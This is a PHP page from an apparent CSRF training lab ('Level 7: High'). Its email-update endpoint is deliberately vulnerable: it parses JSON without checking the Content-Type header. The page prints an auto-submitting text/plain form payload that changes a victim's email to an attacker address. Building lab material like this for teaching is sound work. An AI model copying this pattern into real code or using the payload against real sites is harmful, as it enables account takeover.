<?php
require_once 'session_helper.php';
$msg = '';
$error = '';

// VULNERABLE: Processes JSON requests but does not strictly validate Content-Type header.
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw_input = file_get_contents('php://input');
    $data = json_decode($raw_input, true);
    
    // Check if JSON decoding succeeded and contains expected keys
    if (json_last_error() === JSON_ERROR_NONE && isset($data['action']) && $data['action'] === 'update_email') {
        if (isset($data['email']) && !empty($data['email'])) {
            $_SESSION['email'] = $data['email'];
            $msg = "Success: Email successfully updated via JSON payload to " . htmlspecialchars($data['email']);
            
            // Check content type to see if it was bypassed
            $content_type = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';
            if (strpos($content_type, 'application/json') === false) {
                $msg .= " (Exploited! You bypassed CORS preflight check by using Content-Type: " . htmlspecialchars($content_type) . "!)";
            }
        }
    } else if (!empty($raw_input)) {
        $error = "JSON Parsing Error: Invalid JSON input format supplied.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Level 7: High | CSRF Lab</title>
    <style>
        body { font-family: sans-serif; background-color: #0f172a; color: #f1f5f9; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; }
        .box { background: #1e293b; padding: 30px; border-radius: 12px; max-width: 600px; width: 100%; box-shadow: 0 4px 10px rgba(0,0,0,0.3); border-top: 5px solid #ef4444; }
        h1 { color: #ef4444; margin-top: 0; }
        code { background: #0f172a; padding: 2px 6px; border-radius: 4px; color: #f43f5e; font-family: monospace; }
        pre { background: #0f172a; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #334155; }
        .btn { display: inline-block; background-color: #ef4444; color: white; padding: 10px 15px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; border: none; cursor: pointer; }
        .btn:hover { background-color: #dc2626; }
        a.back { color: #94a3b8; text-decoration: none; display: inline-block; margin-top: 20px; }
        a.back:hover { color: #f1f5f9; }
        .status-box { background: #0f172a; padding: 15px; border-radius: 6px; border: 1px solid #334155; margin-bottom: 20px; }
        .status-val { font-weight: bold; color: #38bdf8; }
        .alert { padding: 12px; border-radius: 6px; margin-bottom: 20px; font-weight: bold; }
        .alert-success { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid #10b981; }
        .alert-danger { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid #ef4444; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Level 7: High — JSON Payload CSRF</h1>

        <?php if (!empty($msg)): ?>
            <div class="alert alert-success"><?php echo $msg; ?></div>
        <?php endif; ?>
        <?php if (!empty($error)): ?>
            <div class="alert alert-danger"><?php echo $error; ?></div>
        <?php endif; ?>

        <!-- Active Session Status -->
        <div class="status-box">
            <p style="margin: 0 0 5px 0; font-size: 0.85rem; color: #94a3b8; text-transform: uppercase;">Current Victim Profile Status</p>
            <div>User: <span class="status-val"><?php echo htmlspecialchars($_SESSION['user']); ?></span></div>
            <div>Email: <span class="status-val"><?php echo htmlspecialchars($_SESSION['email']); ?></span></div>
        </div>

        <p>The backend API expects updates in JSON format. Browsers block cross-origin requests with <code>Content-Type: application/json</code> by triggering a preflight request. However, the server parses the request body as JSON **without verifying that the Content-Type header is strictly application/json**.</p>
        
        <h3>Source Code Snippet:</h3>
        <pre><code>&lt;?php
$raw_input = file_get_contents('php://input');
$data = json_decode($raw_input, true);

// VULNERABLE: Decodes JSON but does not check the Content-Type header!
if (isset($data['action']) && $data['action'] === 'update_email') {
    $_SESSION['email'] = $data['email'];
}
?&gt;</code></pre>

        <h3>Your Goal:</h3>
        <p>Bypass CORS preflight requirements and submit a cross-origin JSON payload. Since cross-origin forms can be submitted using the <code>text/plain</code> content-type without a preflight check, you can construct an HTML form that outputs a valid JSON string as its request body:</p>
        <pre><code>&lt;form action="http://localhost:8080/csrf-lab/level7.php" method="POST" enctype="text/plain" id="csrfForm"&gt;
    &lt;input name='{"action":"update_email","email":"attacker@evil.local","dummy":"' value='test"}' type="hidden"&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;</code></pre>

        <form onsubmit="submitJSONFlow(event)" style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #334155;">
            <label for="email">Update Email (Legitimate AJAX Flow):</label><br>
            <input type="email" id="email" name="email" value="alice@securesite.local" style="width: 100%; padding: 10px; margin-top: 5px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white;" required><br>
            <input type="submit" value="Update Email via JSON" class="btn">
        </form>

        <br>
        <a href="index.php" class="back">⬅️ Back to Dashboard</a>
    </div>

    <script>
        function submitJSONFlow(e) {
            e.preventDefault();
            const emailVal = document.getElementById('email').value;
            
            // Correct API JSON Request
            fetch('level7.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'update_email',
                    email: emailVal
                })
            }).then(() => {
                window.location.reload();
            });
        }
    </script>
</body>
</html>
